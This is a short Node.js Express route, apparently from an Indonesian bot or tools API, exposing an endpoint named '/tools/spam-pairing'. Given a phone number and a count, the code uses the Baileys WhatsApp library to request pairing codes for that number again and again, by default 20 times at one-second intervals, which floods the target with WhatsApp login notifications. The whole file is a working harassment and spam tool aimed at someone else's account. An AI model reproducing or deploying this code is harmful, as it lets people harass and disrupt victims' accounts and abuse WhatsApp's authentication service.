const {
makeWASocket,
useMultiFileAuthState,
makeCacheableSignalKeyStore,
} = require("baileys");
const pino = require("pino");
const chalk = require("chalk");
const path = require("path");

function no(number) {
return number.replace(/\D/g, "").replace(/^0/, "62");
}

module.exports = (app) => {
app.get("/tools/spam-pairing", async (req, res) => {
let { number, count } = req.query;

if (!number) {  
        return res.status(400).json({ error: "❌ Harap masukkan nomor yang valid!" });  
    }  

    let target = no(number);  
    let jumlah = parseInt(count) || 20;  

    let dir = path.join(__dirname, "../../utils");
    const { state } = await useMultiFileAuthState(dir);  

    console.log(  
        `> *– 乂 Memulai Proses Spam!*\n\n` +  
        `> 📞 *Nomor:* @${target}\n` +  
        `> 🔢 *Total:* ${jumlah}`  
    );  

    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: true,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        version: [ 2, 3000, 1015901307 ]
    })

            console.log("> ✅ Koneksi berhasil!");
            setTimeout(async () => {  
                for (let i = 0; i < jumlah; i++) {  
                    try {  
                        let retries = i + 1;  
                        let pairing = await sock.requestPairingCode(target);  
                        let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;  
                          
                        console.log(  
                            `> ${chalk.yellow.bold("[" + retries + "/" + jumlah + "]")} ` +  
                            `😛 Kode pairing anda: ${code}`  
                        );  
                    } catch (err) {  
                        console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);  
                    }  
                    await new Promise(resolve => setTimeout(resolve, 1000));  
                }  
            }, 3000);  

    return res.json({ status: true, result: { message: "✅ Proses pairing dimulai!", target, jumlah } });  
});
};

